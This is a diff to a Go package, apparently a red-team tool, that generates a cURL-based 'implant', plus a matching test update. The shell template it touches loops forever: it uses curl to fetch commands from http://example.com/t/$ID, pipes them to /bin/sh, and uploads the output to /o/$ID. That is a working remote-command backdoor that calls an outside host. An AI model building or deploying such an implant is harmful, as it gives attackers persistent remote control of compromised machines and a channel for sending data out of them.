@@ -5,7 +5,7 @@ package implantsvr
  * Generate a cURL-based "implant"
  * By J. Stuart McMurray
  * Created 20231111
- * Last Modified 20231215
+ * Last Modified 20240117
  */
 
 import (
@@ -50,7 +50,7 @@ while :; do
         (
                 curl -s -m 10 "http://example.com/t/$ID" |
                 /bin/sh 2>&1 |
-                curl --data-binary @- -s -m 10 "http://example.com/o/$ID"
+                curl -T. -s -m 10 "http://example.com/o/$ID"
         ) </dev/null &
         sleep 5
 done
@@ -155,8 +155,8 @@ func TestHandleCurlGen_SelfSigned(t *testing.T) {
 	re := regexp.MustCompile(
 		`(?s:` +
 			`curl -k --pinnedpubkey "sha256//([^"]+)" -s.*` +
-			`curl -k --pinnedpubkey "sha256//([^"]+)" ` +
-			`--data-binary)`,
+			`curl -k --pinnedpubkey "sha256//([^"]+)" -T\. -s.*` +
+			`)`,
 	)
 	ms := re.FindStringSubmatch(string(b))
 	if 3 != len(ms) {
